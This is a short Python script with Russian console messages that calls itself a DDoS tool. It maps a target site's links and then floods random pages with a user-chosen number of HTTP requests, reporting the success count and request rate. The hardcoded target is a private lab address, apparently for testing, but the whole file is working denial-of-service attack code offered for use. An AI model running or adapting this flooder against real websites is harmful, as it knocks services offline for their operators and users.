#!venv/bin/python3

import os
import link_extractor
import time
import random
import progressbar
import faster_than_requests as requests
from datetime import datetime
 
from threading import Thread

global requestCountSuccess, requestCountExecuted

if not os.path.exists('./maps/'):
	os.makedirs('./maps/')


def url_grab(full_url):

	if os.path.exists(f'./maps/{url}'):

		with open(f'./maps/{url}', 'r') as f:
			subUrls = f.read().splitlines()
	else:

		subUrls = link_extractor.extractor('http://' + url)

		os.mknod(f'./maps/{url}')
		with open(f'./maps/{url}', 'w') as f:
			for link in subUrls:
				print(link.strip(), file=f)


	print(datetime.now().strftime('[%X] ') + 'Карта сайта получена')
	return subUrls


class DDoSer(Thread):
	def __init__(self, url):
		Thread.__init__(self)
		self.url = url
		
	def run(self):

		global requestCountSuccess, requestCountExecuted

		# responce = requests.urlopen(self.url).getcode() # urlib
		responce = requests.get(self.url)['status']
		if responce == '200 OK':
			requestCountSuccess += 1

		requestCountExecuted += 1


if __name__ == '__main__':

	# url = input(datetime.now().strftime('[%x %X] ') + 'Введите адрес сайта: ')
	url = '192.168.56.102'

	subUrls = url_grab(url)

	requestCount = int(input(datetime.now().strftime('[%X] ') + 'Введите число запросов: '))
	print()

	startTime = time.time()   
	requestCountExecuted = 0
	requestCountSuccess = 0

	with progressbar.ProgressBar(max_value=requestCount) as bar:
		for i in range(requestCount):
			url = random.choice(subUrls)
			thread = DDoSer(url)
			thread.start()
			thread.join()
			bar.update(requestCountExecuted)
		
		while requestCountExecuted < requestCount:
			bar.update(requestCountExecuted)

	print('\n' + datetime.now().strftime('[%X] ') + 'Всего выслано запросов: ' + str(requestCountExecuted))
	print(datetime.now().strftime('[%X] ') + 'Успешных запросов: ' + str(requestCountSuccess))
	print(datetime.now().strftime('[%X] ') + 'Средняя скорость: ' + str(round(requestCountExecuted/(time.time() - startTime))) + ' з/с')
